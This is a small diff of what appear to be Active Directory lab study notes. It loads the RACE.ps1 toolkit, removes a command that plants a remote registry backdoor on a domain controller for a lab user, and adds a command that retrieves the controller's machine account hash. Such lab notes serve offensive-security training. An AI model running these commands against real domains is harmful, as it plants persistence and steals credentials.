@@ -574,5 +574,6 @@ and retrieve the hash
 . C:\AD\Tools\RACE.ps1
 ```
 ```powershell
-Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
 ```
+![[Pasted image 20231025150902.png]]
